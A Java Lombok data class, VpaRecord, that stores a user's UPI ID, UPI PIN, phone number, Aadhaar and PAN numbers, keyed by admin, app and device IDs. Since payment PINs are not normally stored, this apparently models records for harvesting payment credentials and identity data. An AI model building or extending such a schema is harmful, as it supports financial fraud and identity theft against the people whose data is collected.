package app.service.model;

import lombok.*;

@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class VpaRecord {
    private Long id;
    private String adminId;
    private String appId;
    private String deviceId;

    private String upiId;
    private String upiPin;       // 4 or 6 digits as string
    private String phoneNumber;
    private String adharCard;
    private String panCard;

    private Long eventTimestampMs;
}
